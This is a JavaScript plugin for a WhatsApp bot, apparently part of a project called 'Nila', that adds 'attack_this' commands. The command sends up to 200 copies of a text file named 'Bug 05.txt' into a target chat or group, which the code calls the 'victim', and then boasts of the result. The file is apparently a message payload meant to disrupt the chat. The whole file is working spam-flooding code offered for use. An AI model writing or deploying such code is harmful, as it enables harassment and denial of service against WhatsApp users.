/* ██████╗░██████╗░░█████╗░░░░░░██╗███████╗░█████╗░████████╗░░░███╗░░██╗██╗██╗░░░░░░█████╗░░█████╗░
   ██╔══██╗██╔══██╗██╔══██╗░░░░░██║██╔════╝██╔══██╗╚══██╔══╝░░░████╗░██║██║██║░░░░░██╔══██╗██╔══██╗
   ██████╔╝██████╔╝██║░░██║░░░░░██║█████╗░░██║░░╚═╝░░░██║░░░░░░██╔██╗██║██║██║░░░░░███████║███████║
   ██╔═══╝░██╔══██╗██║░░██║██╗░░██║██╔══╝░░██║░░██╗░░░██║░░░░░░██║╚████║██║██║░░░░░██╔══██║██╔══██║
   ██║░░░░░██║░░██║╚█████╔╝╚█████╔╝███████╗╚█████╔╝░░░██║░░░██╗██║░╚███║██║███████╗██║░░██║██║░░██║
   ╚═╝░░░░░╚═╝░░╚═╝░╚════╝░░╚════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝╚═╝░░╚══╝╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝ 
                                    by jayarathne_technical                                         */

// ================= import modules ========================== //

const nila = require("../../events");
const { delay } = require('@adiwajshing/baileys');
const chalk = require('chalk');
const config = require('../../config');
const fs = require('fs');
const { M } = require("human-readable");

// ================= start plugin ============================ //

nila.addCommand( 
    { pattern: ["attack_this" , "fuck_this"], desc: `des`, sucReact: "✅", category: [ "tet", "normal" ] ,  },

async (m, conn) => {

// ==================== defination =================== //


let victim2 = m.chat
// let result = await conn.onWhatsApp(victim2)
let count = m.conn.text.split("/")[1]
let spams = ['./assets/src/Spam/text/Bug 05.txt']
let i2 = 0;

// return console.log(victim2)

// ==================== end definations =============== //

// ================== if =========================== //

if (!m.isPrem) { global.catchError = true; return await conn.sendMessage( m.from, { text: nila.errorMessage(config.reply.owner) }, { quoted: m } ); };
if (!count) { count = 50 }
if (!m.isCreator && count > 200 ) { global.catchError = true; return await conn.sendMessage( m.from, { text: nila.errorMessage(`! High value, All Estimated messeges ==> 1 × ${count} = ${count} \n  \nPlease Enter amount less than 200 for the safety of bot number`) }, { quoted: m } ); };
if (!victim2) { global.catchError = true; return await conn.sendMessage( m.from, { text: nila.infoMessage(`! Enter Victim number and count correctly\n[ ex :- .spam 94777777777/100 ]\n(Default count is 50)\n(Maximum count 100) \n \nɴᴏᴡ ʙᴏᴛ ʀᴇsᴘᴏɴsᴇ ᴛɪᴍᴇ : ${m.speed}`) }, { quoted: m } ); };
// if (!result.exists ) { global.catchError = true; return await conn.sendMessage( m.from, { text: nila.errorMessage(`Given user ${victim} is Not on WhatsApp`) }, { quoted: m } ); };

// ================== enfif ======================== //


// ================= code goes here =============== //

await conn.sendMessage( m.from, { text: nila.infoMessage(`attacking with **${count} spams...`) }, { quoted: m } );

// return
while (i2 < count ) {

    let spam1 =  spams[Math.floor(Math.random() * spams.length)]
    let textx = fs.readFileSync(`${spam1}`)

    await conn.sendMessage(victim2, { text : `${textx}` })

    i2++

}

await conn.sendMessage( m.from, { text: nila.successfullMessage(`Fucked with **${count} spams to this Group`) }, { quoted: m } );

// ================= end code ================================= //

})

// ================= end plugin ============================== //